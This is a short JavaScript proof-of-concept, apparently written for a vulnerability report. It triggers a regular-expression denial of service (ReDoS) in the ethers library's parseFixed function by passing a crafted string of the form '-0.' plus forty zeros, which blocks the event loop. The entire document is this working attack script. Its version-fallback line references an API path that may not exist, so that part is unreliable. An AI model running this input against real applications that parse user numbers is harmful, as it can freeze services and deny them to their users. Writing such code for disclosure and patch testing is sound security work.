async function exploit() {
  // Dynamically resolve the parseFixed API to remain compatible across ethers v5/v6+ structures
  const ethers = await import("ethers");
  const parseFixed = ethers.utils?.parseFixed || ethers.format?.fixedNumber;

  if (!parseFixed) {
    throw new Error("parseFixed not available in this version of ethers.");
  }

  // Vulnerability trigger: "-" + "0" + "." + many trailing zeros.
  // This input creates overlapping optional matches in the vulnerable regex, causing 
  // exponential backtracking (O(2^n)). At N=40, backtrack operations will comfortably 
  // exceed the 30,000 step threshold mentioned in the vulnerability report.
  const maliciousInput = "-0." + "0".repeat(40);

  console.log(`[PoC] Testing ReDoS on parseFixed`);
  console.log(`[PoC] Input length: ${maliciousInput.length}`);
  console.time("reDos_trigger");

  // In a vulnerable implementation, this call will block the event loop 
  // (causing DoS) or throw a backtracking limit error. No try/catch is used 
  // so the failure propagates visibly as requested.
  parseFixed(maliciousInput, 18);

  console.timeEnd("reDos_trigger");
}

